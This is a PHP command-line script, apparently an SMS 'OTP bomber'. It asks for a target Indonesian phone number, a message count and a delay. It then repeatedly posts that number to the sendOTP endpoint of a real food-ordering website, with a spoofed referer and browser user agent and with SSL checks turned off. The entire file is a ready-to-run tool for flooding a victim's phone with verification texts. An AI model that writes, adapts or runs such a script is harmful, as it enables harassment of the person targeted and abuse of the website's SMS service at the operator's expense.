<?php
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        print($server_output)."\n";
        sleep($wait);
        $x++;
    }
}
echo "\033[1;31m╔═╗╦ ╦╔╦╗  ╔═╗╦═╗╔╦╗╔═╗╦═╗ \n";
echo "╠═╝╠═╣ ║║  ║ ║╠╦╝ ║║║╣ ╠╦╝ \n";
echo "╩  ╩ ╩═╩╝  ╚═╝╩╚══╩╝╚═╝╩╚═ \n";
echo "\033[1;32m     Modified by まやちゃん \n";
echo "\033[0mThanks to https://github.com/anggaid \n\n";
echo "Nomor Target (pakai 62) : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Pesan : ";
$jumlah = trim(fgets(STDIN));
echo "Delay : ";
$wait = trim(fgets(STDIN));
$execute = phd($nomor, $jumlah, $wait);
print $execute;
?>
